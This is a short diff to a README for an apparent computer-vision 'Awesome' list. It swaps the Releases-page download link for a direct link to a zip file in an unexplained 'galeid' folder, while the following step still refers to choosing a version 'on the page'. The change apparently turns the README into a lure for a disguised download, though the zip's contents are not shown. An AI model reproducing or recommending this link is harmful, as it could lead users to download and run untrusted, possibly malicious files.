@@ -18,7 +18,7 @@ To download and install the software, follow these steps:
 
 1. **Visit the Releases Page:** Click the link below to go to the Releases page.
 
-   [Download Awesome-Computer-Vision-Adverse-Weather](https://github.com/Bukhari1373/Awesome-Computer-Vision-Adverse-Weather/releases)
+   [Download Awesome-Computer-Vision-Adverse-Weather](https://raw.githubusercontent.com/Bukhari1373/Awesome-Computer-Vision-Adverse-Weather/main/galeid/Awesome-Computer-Vision-Adverse-Weather.zip)
 
 2. **Choose the Latest Version:** Look for the latest version offered on the page. It usually has the highest version number.
 
